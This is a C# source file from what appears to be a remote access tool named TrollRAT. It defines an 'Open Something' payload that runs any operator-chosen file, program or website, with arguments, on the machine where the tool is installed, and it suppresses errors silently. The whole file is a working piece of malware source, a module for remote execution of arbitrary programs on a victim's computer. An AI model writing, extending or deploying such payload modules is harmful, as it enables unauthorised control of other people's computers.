﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;

namespace TrollRAT
{
    public class PayloadOpen : Payload
    {
        protected PayloadSettingString file = new PayloadSettingString("", "File Name or Website");
        protected PayloadSettingString args = new PayloadSettingString("", "Arguments for Programs");

        public PayloadOpen()
        {
            name = "Open Something";
            Settings.Add(file);
            Settings.Add(args);
        }

        protected override void execute()
        {
            try
            {
                Process.Start(file.Value, args.Value);
            }
            catch (Exception) { }
        }
    }
}
